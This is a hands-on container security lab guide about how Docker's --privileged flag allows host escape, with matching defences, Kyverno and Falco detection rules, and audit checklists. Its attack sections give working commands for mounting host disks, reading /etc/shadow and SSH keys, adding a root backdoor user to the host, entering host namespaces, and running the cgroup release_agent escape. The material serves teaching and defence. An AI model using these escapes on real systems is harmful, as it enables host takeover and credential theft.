# Scenario 2: Privileged Mode — The Master Key

## Overview

This scenario demonstrates how the `--privileged` flag hands a container the closest thing Docker offers to bare-metal host access. Unlike targeted capabilities or bind mounts, `--privileged` grants all 41 Linux capabilities simultaneously, exposes every host block device, and removes the namespace boundaries that are supposed to keep containers isolated. It is the single most dangerous flag you can pass to `docker run`.

**Attack Complexity:** Low  
**Detection Difficulty:** Low (if you audit for it)  
**Prevalence:** Common in development and CI/CD environments  
**Impact:** Critical (full host compromise from a single container)

## Table of Contents

1. [Understanding --privileged](#understanding---privileged)
2. [Why Teams Use It](#why-teams-use-it)
3. [Attack Demonstrations](#attack-demonstrations)
4. [Defense Strategies](#defense-strategies)
5. [Hands-On Lab](#hands-on-lab)
6. [Detection and Monitoring](#detection-and-monitoring)

---

## Understanding --privileged

### What Does --privileged Actually Do?

When you pass `--privileged` to `docker run`, Docker does three things at once:

1. Grants **all 41 Linux capabilities** to the container process.
2. Mounts **all host block devices** into `/dev/` inside the container.
3. Sets the **seccomp profile to unfiltered**, allowing every syscall.

The net effect is that the container process has nearly the same access to the system as a process running directly on the host. The container filesystem is still separate, but everything else — devices, namespaces, kernel interfaces — is shared.

### Privileged vs Normal vs CAP_SYS_ADMIN

```bash
# Normal container — 14 capabilities, restricted /dev/
docker run --rm alpine sh -c 'cat /proc/self/status | grep CapEff'
# CapEff: 00000000a80425fb

# Privileged container — all 41 capabilities, full /dev/
docker run --rm --privileged alpine sh -c 'cat /proc/self/status | grep CapEff'
# CapEff: 0000003fffffffff

# CAP_SYS_ADMIN only — 15 capabilities (covered in Scenario 3)
docker run --rm --cap-add=SYS_ADMIN alpine sh -c 'cat /proc/self/status | grep CapEff'
# CapEff: 00000000a8042dff
```

The hex values tell the story. A normal container has a sparse bitmask. A privileged container has every bit set. `CAP_SYS_ADMIN` adds one bit, but it's a very powerful one — Scenario 3 covers that angle specifically.

### The Device Exposure Problem

The most immediate difference you can observe is in `/dev/`:

```bash
# Normal container — only virtual devices
docker run --rm alpine ls /dev/
# console  full  null  ptmx  pts  random  stderr  stdin  stdout  tty  urandom  zero

# Privileged container — host block devices appear
docker run --rm --privileged alpine ls /dev/
# console  full  loop0  loop1  ...  null  ptmx  pts  random  sda  sda1  sda2  stderr  ...
```

Those `sda*` or `nvme*` entries are the actual host disk partitions. A privileged container can mount them directly.

---

## Why Teams Use It

### Common Justifications

#### 1. Docker-in-Docker (DinD)
```bash
# Running Docker builds inside a container
docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock docker:latest docker build .
```
**Developer reasoning:** "CI needs to build images, and DinD requires it."  
**Reality:** Kaniko, Buildah, and BuildKit all build images without `--privileged`.

#### 2. Network Debugging
```bash
# Running tcpdump or similar tools
docker run --privileged --net=host myapp tcpdump -i eth0
```
**Developer reasoning:** "We need to capture packets on the host interface."  
**Reality:** `--cap-add=NET_RAW` with `--net=host` gives you packet capture without full privilege.

#### 3. Filesystem Testing
```bash
# Testing mount behavior or overlay filesystems
docker run --privileged alpine mount -t tmpfs none /mnt
```
**Developer reasoning:** "The test needs mount syscall access."  
**Reality:** `--cap-add=SYS_ADMIN` scoped to a specific operation is sufficient, and Scenario 3 documents exactly what that buys you.

#### 4. Legacy Scripts
```bash
# Old automation that was never revisited
docker run --privileged mylegacy-app
```
**Developer reasoning:** "It was set up years ago and nobody wants to touch it."  
**Reality:** This is the most common production occurrence and the hardest to justify.

### The Problem

In every case above, a more restricted alternative exists. `--privileged` persists because it works immediately and nobody revisits it afterward. A container that was privileged for a debugging session two years ago stays privileged indefinitely.

---

## Attack Demonstrations

### Prerequisites

```bash
# Ensure you're in the scenario directory
cd labs/09-runtime-escape/scenario-2-privileged

# Make scripts executable
chmod +x *.sh
```

### Attack 1: Privileged vs Normal — What Changes

**Scenario:** Observe exactly what `--privileged` unlocks compared to a standard container.

**Setup:**
```bash
# No setup needed — both containers start and exit immediately
```

**Attack:**
```bash
# Step 1: Compare capability bitmasks
echo "=== Normal Container ==="
docker run --rm alpine sh -c 'cat /proc/self/status | grep CapEff'

echo "=== Privileged Container ==="
docker run --rm --privileged alpine sh -c 'cat /proc/self/status | grep CapEff'

# Step 2: Compare /dev/ contents
echo "=== Normal /dev/ ==="
docker run --rm alpine ls /dev/

echo "=== Privileged /dev/ ==="
docker run --rm --privileged alpine ls /dev/
# Look for sda, nvme, vd entries — these are host disks
```

**What to observe:** The capability bitmask jumps from a sparse value to `0000003fffffffff`. The `/dev/` listing gains block device entries that map directly to the host's storage.

---

### Attack 2: Host Filesystem via Block Device Mount

**Scenario:** A privileged container can see host block devices in `/dev/` and mount them, gaining read/write access to the host filesystem.

**Setup:**
```bash
docker run -dit --name priv-escape --privileged alpine sleep 120
```

**Attack:**
```bash
# Step 1: Find a host block device
docker exec priv-escape sh -c 'ls /dev/sd* /dev/vd* /dev/nvme* /dev/xvd* 2>/dev/null | head -1'
# Output: /dev/sda1 (or similar — device name depends on host)

# Step 2: Mount it (use the device found in Step 1)
docker exec priv-escape sh -c '
  mkdir -p /mnt/host
  mount /dev/sda1 /mnt/host
'

# Step 3: Read host-sensitive files
docker exec priv-escape cat /mnt/host/etc/shadow
# Output: Host password hashes

docker exec priv-escape cat /mnt/host/root/.ssh/id_rsa
# Output: Host SSH private key (if present)

# Step 4: Write to host filesystem
docker exec priv-escape sh -c '
  echo "attacker:x:0:0:root:/root:/bin/bash" >> /mnt/host/etc/passwd
'
# A backdoor user now exists on the HOST
```

**Docker Desktop note:** On macOS, host block devices are not exposed because Docker runs inside a Linux VM. The `/dev/` listing will show only virtual devices. On a Linux host, the attack works as written. The demo script handles this gracefully and shows what the attack would look like on a real server.

**Cleanup:**
```bash
docker rm -f priv-escape
```

---

### Attack 3: Network Namespace Escape

**Scenario:** A privileged container can enumerate and enter the host's network namespace, gaining visibility into all host network interfaces and traffic.

**Setup:**
```bash
docker run -dit --name priv-netns --privileged alpine sleep 120
docker exec priv-netns apk add -q iproute2
```

**Attack:**
```bash
# Step 1: List all network namespaces visible via /proc
docker exec priv-netns sh -c 'ls /proc/[0-9]*/ns/net 2>/dev/null | head -10'
# Shows namespaces for host processes, not just container processes

# Step 2: Enter the host network namespace
docker exec priv-netns nsenter --target 1 --net -- ip addr
# Output: Host network interfaces (eth0, docker0, br-*, etc.)

# Step 3: In a real attack, this enables:
#   - Packet capture on host interfaces
#   - Traffic interception between containers
#   - Access to internal network routes not visible from outside
```

**Docker Desktop note:** `nsenter` into PID 1 is blocked on macOS Docker Desktop because PID 1 belongs to the VM, not a real host process. On a Linux host, this works as written.

**Cleanup:**
```bash
docker rm -f priv-netns
```

---

### Attack 4: Cgroup Release Agent Escape (Felix Wilhelm)

**Scenario:** The most dangerous privileged container attack. A privileged container can create a cgroup, set its `release_agent` to a payload script, and trigger execution of that payload **on the host** — completely outside the container.

This is the technique documented by Felix Wilhelm in 2019. It does not require any vulnerability in Docker — it uses the kernel's cgroup notification mechanism as intended, but from a context where it should not be accessible.

**Setup:**
```bash
docker run -dit --name priv-cgroup --privileged alpine sleep 120
```

**Attack:**
```bash
docker exec priv-cgroup sh -c '
# Step 1: Mount a new cgroup
mkdir -p /tmp/cgroup-escape
mount -t cgroup -o none,name=escape cgroup /tmp/cgroup-escape

# Step 2: Enable release notification
echo 1 > /tmp/cgroup-escape/notify_on_release

# Step 3: Find the host path to our container overlay
# This tells us where our container filesystem lives on the host
HOST_PATH=$(sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /proc/1/mountinfo | head -1)
echo "Host overlay path: $HOST_PATH"

# Step 4: Write a payload script inside the container
# When the cgroup exits, the kernel runs this script on the HOST
cat > /tmp/payload.sh << PAYLOAD
#!/bin/sh
echo "ESCAPED: $(hostname) $(date)" > /tmp/escape-proof.txt
PAYLOAD
chmod +x /tmp/payload.sh

# Step 5: Point release_agent at our payload via the host path
echo "${HOST_PATH}/tmp/payload.sh" > /tmp/cgroup-escape/release_agent

# Step 6: Trigger — create a child cgroup, add a process, then remove it
mkdir -p /tmp/cgroup-escape/trigger
echo 1 > /tmp/cgroup-escape/trigger/notify_on_release
sh -c "echo \$\$ > /tmp/cgroup-escape/trigger/cgroup.procs"
sleep 1
rmdir /tmp/cgroup-escape/trigger

# Step 7: Check for proof of host-level execution
cat /tmp/escape-proof.txt 2>/dev/null || echo "Blocked by runtime (expected on Docker Desktop)"
'
```

**How it works:** The kernel's cgroup subsystem runs `release_agent` when the last process exits a cgroup. Because the privileged container can mount cgroups and write to `release_agent`, it can make the kernel execute an arbitrary script. That script runs as the Docker daemon's user — typically root — on the host, not inside any container.

**Docker Desktop note:** Cgroup v2 and Docker Desktop's VM boundary block this technique in most macOS environments. On a Linux host with cgroup v1, this executes code on the host.

**Cleanup:**
```bash
docker rm -f priv-cgroup
```

---

## Defense Strategies

### Defense 1: Never Use --privileged

This is not a configuration to tune — it is a flag to eliminate.

#### Docker CLI
```bash
# Instead of:
docker run --privileged myapp

# Use targeted capabilities:
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp

# Or if specific capabilities are needed, add only those:
docker run --cap-drop=ALL --cap-add=NET_ADMIN --cap-add=NET_RAW myapp
```

#### Docker Compose
```yaml
# File: artifacts/docker-compose-secure.yml
version: '3.8'

services:
  secure-app:
    image: myapp:latest

    security_opt:
      - no-new-privileges:true

    cap_drop:
      - ALL

    cap_add:
      - NET_BIND_SERVICE
      # --privileged is not an option here

    read_only: true
    user: "1000:1000"

    tmpfs:
      - /tmp:noexec,nosuid,size=64m
```

#### Kubernetes Pod Spec
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault

  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE
```

---

### Defense 2: Block at Admission Time

Prevent privileged containers from ever being created in your cluster.

#### Kyverno Policy
```yaml
# File: artifacts/kyverno-block-privileged.yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-privileged-containers
  annotations:
    policies.kyverno.io/title: Block Privileged Containers
    policies.kyverno.io/category: Security
    policies.kyverno.io/severity: critical
    policies.kyverno.io/description: >-
      Privileged containers have full host access and must be blocked.
      Use specific capabilities instead.

spec:
  validationFailureAction: enforce
  background: true

  rules:
  - name: check-privileged
    match:
      any:
      - resources:
          kinds:
          - Pod

    validate:
      message: >-
        Running containers in privileged mode is not allowed.
        Use --cap-add with specific capabilities instead of --privileged.
      pattern:
        spec:
          containers:
          - X-(securityContext|privileged):
              privileged: "false"
```

#### Pod Security Standards
```yaml
# Built into Kubernetes — enforce via namespace label
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

The `restricted` profile blocks `--privileged` automatically across the namespace.

---

### Defense 3: Docker Daemon Hardening

```json
{
  "no-new-privileges": true,
  "userns-remap": "default",
  "default-capabilities": [
    "CHOWN",
    "DAC_OVERRIDE",
    "FOWNER",
    "FSETID",
    "KILL",
    "SETGID",
    "SETUID",
    "SETPCAP",
    "NET_BIND_SERVICE",
    "NET_RAW",
    "SYS_CHROOT",
    "MKNOD",
    "AUDIT_WRITE",
    "SETFCAP"
  ]
}
```

`userns-remap` maps the container's root UID to an unprivileged UID on the host. Even if a container escapes, it runs as a regular user. `no-new-privileges` prevents privilege escalation via setuid binaries.

---

## Hands-On Lab

### Quick Start

Run the automated demonstration:
```bash
./demo.sh
```

This will:
1. Compare privileged vs normal container capabilities and `/dev/` contents
2. Demonstrate host filesystem access via block device (or show the attack path on Docker Desktop)
3. Demonstrate network namespace escape
4. Walk through the cgroup release_agent escape (Felix Wilhelm technique)
5. Show detection with the audit script

### Manual Step-by-Step

#### Step 1: Observe the Difference

```bash
# Side-by-side capability and device comparison
echo "=== Normal ==="
docker run --rm alpine sh -c 'cat /proc/self/status | grep CapEff; echo; ls /dev/'

echo -e "\n=== Privileged ==="
docker run --rm --privileged alpine sh -c 'cat /proc/self/status | grep CapEff; echo; ls /dev/'
```

#### Step 2: Attempt the Escape

```bash
# Follow Attack 2, 3, or 4 step-by-step above
# Attack 2 (block device mount) is the most straightforward on Linux hosts
# Attack 4 (cgroup escape) is the most dangerous in production
```

#### Step 3: Implement Defenses

```bash
# Run defense script
./defense.sh

# Or apply policies manually:
# Docker Compose — see artifacts/docker-compose-secure.yml
# Kubernetes — see artifacts/kyverno-block-privileged.yaml
```

#### Step 4: Verify Detection

```bash
# Run audit against current Docker host
./artifacts/audit-privileged.sh

# It scans for:
#   - Containers with --privileged flag
#   - Containers with CAP_SYS_ADMIN (near-privileged)
#   - Missing daemon hardening (no-new-privileges, userns-remap)
```

#### Step 5: Cleanup

```bash
./cleanup.sh
```

---

## Detection and Monitoring

### Audit Script: Find Privileged Containers

The audit script (`artifacts/audit-privileged.sh`) scans all running containers and flags two categories:

**Critical** — containers with `Privileged: true`. These have full host access right now.

**High** — containers with `CAP_SYS_ADMIN` in their capability list. These are not flagged as privileged by standard checks but have nearly equivalent escape potential (see Scenario 3).

```bash
# Run the audit
chmod +x artifacts/audit-privileged.sh
./artifacts/audit-privileged.sh

# Example output:
# 🚨 FOUND: my-legacy-app - PRIVILEGED MODE
#   Image: myregistry/legacy:2.1
#   Risk: CRITICAL - Full host access
#
# 🚨 FOUND: monitoring-agent - Has CAP_SYS_ADMIN (near-privileged)
#   Image: datadog/agent:latest
#   Capabilities: [SYS_ADMIN]
#   Risk: HIGH - Near-privileged access
```

The script also checks daemon configuration for `no-new-privileges` and `userns-remap`, and exports a full JSON report to `/tmp/`.

### Falco Runtime Detection

```yaml
# Detect privileged container creation
- rule: Privileged Container Started
  desc: A privileged container was started
  condition: >
    container_started and
    container.privileged = true
  output: >
    Privileged container started
    (user=%user.name container_id=%container.id
    container_name=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container, privileged, escape]

# Detect block device access from any container
- rule: Container Block Device Access
  desc: A container accessed a host block device
  condition: >
    open and
    container and
    fd.name startswith /dev/ and
    fd.name pmatch (/dev/sd*, /dev/vd*, /dev/nvme*, /dev/xvd*)
  output: >
    Container accessed host block device
    (user=%user.name container_id=%container.id
    container_name=%container.name device=%fd.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, device, privileged, escape]

# Detect cgroup release_agent modification
- rule: Cgroup Release Agent Write
  desc: A container wrote to cgroup release_agent — classic escape technique
  condition: >
    open_write and
    container and
    fd.name contains "release_agent"
  output: >
    Cgroup release_agent modified — possible container escape
    (user=%user.name container_id=%container.id
    container_name=%container.name file=%fd.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, cgroup, escape, privileged]
```

### Continuous Monitoring Checklist

- Alert on any container starting with `privileged: true`
- Alert on block device access (`/dev/sd*`, `/dev/nvme*`) from containers
- Alert on `release_agent` writes in `/sys/fs/cgroup`
- Alert on `nsenter` execution inside containers
- Weekly automated audit via `audit-privileged.sh`

---

## Summary

### Key Takeaways

1. **--privileged is a single flag that disables container isolation**
   - All 41 capabilities, all host devices, no seccomp filtering
   - Not a "slightly elevated" container — effectively bare-metal access

2. **Detection is easy — but only if you look for it**
   - `docker inspect` shows `Privileged: true` immediately
   - Most teams never run this check in production
   - The audit script automates what should be a routine scan

3. **The cgroup escape is the real danger**
   - Executes code on the host, outside any container
   - Uses kernel cgroup notification — not a Docker bug
   - Blocked by cgroup v2 and user namespace remapping

4. **Every --privileged use case has a safer alternative**
   - DinD → Kaniko, Buildah, BuildKit
   - Network tools → `--cap-add=NET_RAW`
   - Mount operations → `--cap-add=SYS_ADMIN` (see Scenario 3 for its own risks)
   - Legacy scripts → audit and replace

### Production Checklist

- [ ] Audit all containers for `--privileged` flag
- [ ] Audit all containers for `CAP_SYS_ADMIN` (see Scenario 3)
- [ ] Deploy admission policy blocking `--privileged` (Kyverno or Pod Security Standards)
- [ ] Enable `no-new-privileges` and `userns-remap` in daemon config
- [ ] Deploy Falco rules for block device access and cgroup writes
- [ ] Replace DinD with rootless build alternatives
- [ ] Document any exceptions with justification and review date
- [ ] Re-audit monthly

---

## References

- [Felix Wilhelm — Container Escape via Cgroup Release Agent (2019)](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Docker Security Best Practices](https://docs.docker.com/develop/security/best-practices/)
- [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmarks/docker)

---

## Lab Files

- `demo.sh` — Automated attack demonstrations (5 demos)
- `defense.sh` — Defense implementation
- `cleanup.sh` — Remove all lab artifacts
- `validate.sh` — Verify defenses are active
- `artifacts/audit-privileged.sh` — Production audit script
- `artifacts/docker-compose-secure.yml` — Secure Compose template
- `artifacts/kyverno-block-privileged.yaml` — Admission policy

---

**Next Scenario:** [Scenario 3: CAP_SYS_ADMIN](../scenario-3-sys-admin/)  
**Previous Scenario:** [Scenario 1: Docker Socket](../scenario-1-docker-sock/)  
**Main Lab:** [Lab 09: Runtime Escape](../)  
**Repository:** [docker-security-practical-guide](https://github.com/opscart/docker-security-practical-guide)